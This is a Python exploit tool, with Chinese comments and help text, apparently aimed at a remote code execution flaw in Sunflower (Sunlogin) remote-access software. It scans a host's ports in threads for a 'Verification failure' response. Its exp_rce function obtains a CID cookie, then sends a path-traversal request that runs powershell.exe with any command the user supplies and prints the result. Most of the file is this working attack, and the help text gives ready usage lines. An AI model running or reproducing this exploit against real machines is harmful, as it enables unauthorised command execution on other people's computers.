import thread_port_scan
import re
import sys
import requests
import threading
import queue
from requests.exceptions import ReadTimeout,ConnectionError,RequestException


class threadScan(threading.Thread):                     #创建线程类：直接创建一个Thread的子类来创建一个线程对象以实现多线程
    def __init__(self,ip,port_list):
        threading.Thread.__init__(self)
        self.ip = ip
        self.portlist = port_list

    def run(self):
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"}
        while True:
            if self.portlist.empty():
                break

            ip = self.ip
            port = self.portlist.get()
            url = "http://" + ip + ":" + str(port)
            # print(url)

            try:
                s = requests.session()
                response = s.get(url=url,headers=headers,timeout=2)
                # print(response.text)
                if "Verification failure" in response.text:
                    print("主机",ip,"的", port, "端口疑似存在RCE漏洞！！！")


            except ReadTimeout:
                print("主机",ip,"的", port,"端口 ---timeout")
            except ConnectionError:
                print("主机",ip,"的", port, "端口 ---connectionError")
            except RequestException:
                print("主机",ip,"的", port, "端口 ---reuqestsException")
            finally:
                s.close()



def poc_port(ip,port_list,thread_num):       #多线程，验证端口

    threads = []
    port_queue = queue.Queue()

    for port in port_list:
        port_queue.put(port)
    for i in range(thread_num):
        threads.append(threadScan(ip,port_queue))
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()


def poc():                                          #漏洞验证函数
    args = sys.argv
    if "--ip" in args:
        ip = args[args.index("--ip") + 1]
    if "--port" in args:
        ports = args[args.index("--port") + 1]
        port_list = get_port(ports)
    # if "--thread" in args:
    #     thread_num = int(args[args.index("--thread") + 1])
    thread_num = 10

    poc_port(ip, port_list, thread_num)


def exp_rce(ip,port,command):
    payload1 = "/cgi-bin/rpc?action=verify-haras"
    payload2 = "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0"}

    if "http://" not in ip:
        host = "http://" + ip + ":"
    else:
        host = ip


    try:
        s = requests.session()
        response = s.get(url=host+port+payload1,headers=headers)

        if response.status_code == 200:
            response = response.json()
            cid = response['verify_string']
            headers.update({"Cookie":"CID="+cid})
            response1 = requests.get(url=host+port+payload2+command,headers=headers)
            response1.encoding = "GBK"
            print("命令执行结果为：",response1.text)
        else:
            pass
    except ReadTimeout:
        print(host+port, "---timeout")
    except ConnectionError:
        print(host+port, "---connectionError")
    except RequestException:
        print(host+port, "---reuqestsException")
    finally:
        s.close()



def exp():                                             #漏洞利用函数
    args = sys.argv
    if "--ip" in args:
        ip = args[args.index("--ip") + 1]
    if "--port" in args:
        port = args[args.index("--port") + 1]
    if "--command" in args:
        command = args[args.index("--command") + 1]

    print("")
    exp_rce(ip,port,command)




def get_port(ports):                                #获取控制台输入的端口，将其转换为列表
    if "," in ports:                             #将逗号分割的端口转换为列表
        port_list1 = ports.split(",")
        return list(map(int, port_list1))                       #将列表内容转换为int型
    elif "-" in ports:                           #将-之间的数转化为列表
        num = re.findall(r"\d+",ports)                           #利用正则表达式获取*两边的数字，r“\d+”正则表达式表示匹配连续的多个数值，
        a = int(num[0])
        b = int(num[1])+1
        port_list2 = list(range(a,b))                           #获取减号两端数字的范围
        return port_list2
    elif "," or "-" not in ports:                 #将单个端口转换为列表--赋值操作
        port_list3 = [0]
        # print(type(port_list3))                                #<class 'str'>
        ports = int(ports)
        port_list3[0] = ports
        # print(port_list3)
        return port_list3
    else:
        print("端口输入错误！！！")


def logo():
    logo = """
            -----      -----                      /-------|                                                                                                                   
            |    \     |   |                     /        |                                                                               
            |     \    |   |                    /___/ |   |                                                                                  
            |      \   |   |                          |   |                                                                             
            |   \   \  |   |                          |   |                                                                                              
            |   |\   \ |   |                          |   |                                                                                     
            |   | \   \|   |                          |   |                                                                                              
            |   |  \   \   |                          |   |                                                                                                
            |   |   \      |                          |   |                                                                                                  
            |   |    \     |         ...              |   |                                                                                                       
            |   |     \    |         ...          ___/     \___                                                                                             
            -----      -----                     |_____________|                                     
    """
    print(logo)


def help():
    help = """
端口探测：
eg：python sunflower_poc_exp.py --scan --ip <ip> --port <port list> --thread <num>     #参数需使用者指定
    python sunflower_poc_exp.py --scan                                                 #均使用默认参数
--scan  扫描参数
--ip 需要扫描的ip地址   默认扫描ip地址为：127.0.0.1
--port 需要扫描的端口列表  默认扫描端口为：<40000,65535>
--thread 扫描时的线程数  默认线程数为100

poc：
eg: python sunflower_poc_exp.py --poc --ip 127.0.0.1 --port 80,90,1431
--poc 漏洞验证参数
--ip 待验证存在漏洞的ip
--port 待验证存在漏洞的端口，支持单端口、端口范围、端口枚举

exp：
eg: python sunflower_poc_exp.py --exp --ip 127.0.0.1 --port 80 --command whoami
--exp 漏洞利用参数
--ip 存在漏洞的ip
--port 存在漏洞的端口
--command 需执行的命令

--help 帮助
    """
    print(help)


if __name__ == "__main__":
    args = sys.argv
    logo()

    if "--help" in args:
        help()
        exit()

    if "--scan" in args:
        thread_port_scan.port_scan()

    if "--poc" in args:
        poc()

    if "--exp" in args:
        exp()